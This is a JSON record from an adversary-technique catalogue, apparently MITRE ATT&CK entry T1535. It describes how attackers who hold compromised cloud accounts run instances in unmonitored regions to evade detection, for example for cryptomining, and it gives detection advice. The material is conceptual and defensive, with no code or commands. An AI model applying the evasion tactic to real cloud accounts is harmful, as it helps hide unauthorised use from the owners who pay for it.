{"technique_id":"T1535","technique_name":"Unused/Unsupported Cloud Regions","description":"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected. A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.","detection":"Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.","procedures":null,"tactics":"TA0005 - Defense Evasion"}